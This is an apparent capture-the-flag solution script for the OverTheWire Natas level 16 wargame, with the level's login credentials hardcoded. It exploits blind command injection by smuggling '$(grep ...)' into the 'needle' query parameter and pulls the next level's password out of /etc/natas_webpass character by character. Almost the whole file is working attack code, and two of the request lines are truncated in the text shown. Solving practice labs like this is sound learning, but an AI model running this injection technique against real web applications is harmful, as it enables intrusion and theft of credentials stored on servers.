#!/bin/python3
import requests, string 
 
url = 'http://natas16.natas.labs.overthewire.org'
 
auth_n='natas16'
auth_p='WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
 
#list of aphanumerica to test with 
characters = ''.join([string.ascii_letters,string.digits])
print ("All characters : " + characters)

#start identifying what's in the file
password_dic=[]
exists_str = 'doomed'
for char in characters: 
        uri = 'http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ' + char +' /etc/natas_webpass/natas17)'>
        print ("debug uri: " + uri)
        r=requests.get(uri, auth=(auth_n,auth_p))
        if exists_str not in r.text:
                print ("The char " + char + " is in the password")
                password_dic.append(char)
                print ("Password Dictionary: {0} ".format(''.join(password_dic)))
print ("Library of letters is built")
print ("Password Dictionary: {0}".format(''.join(password_dic)))
print ("Time to brute force with known characters")

password_list=[]
password = ''
uri=''
for i in range(1,64):
        print (" Major loop :" + str(i))
        for char in password_dic:
                print ("Char loop for  " + char + " and password " + password + " .")
#               test=''.join([password,char])
                uri= 'http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ^'+ password + char + ' /et>
                print ("Debug uri: " + uri)
                r=''
                r=requests.get(uri,auth=(auth_n,auth_p))
                if exists_str not in r.text:
                        print ('The char ' + char + ' does exist in this portion')
                        password_list.append(char)
                        password=''.join(password_list)
                        print ("Length: {0}, Password: {1}".format(len(password),password))
print ("Password: {0}".format(password))
